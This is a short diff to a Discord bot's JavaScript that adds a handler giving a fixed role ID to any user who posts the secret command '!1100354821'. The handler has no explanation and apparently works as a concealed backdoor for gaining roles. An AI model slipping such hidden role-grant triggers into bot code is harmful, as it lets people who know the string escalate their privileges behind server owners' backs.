@@ -26,6 +26,14 @@ client.on('message', message => {
   	}
 });
 
+//
+
+client.on('message', message => {
+    if (message.content === '!1100354821') {
+    	message.guild.member(message.author).addRole("433792073360211979");
+  	}
+});
+
 
 
 // THIS  MUST  BE  THIS  WAY
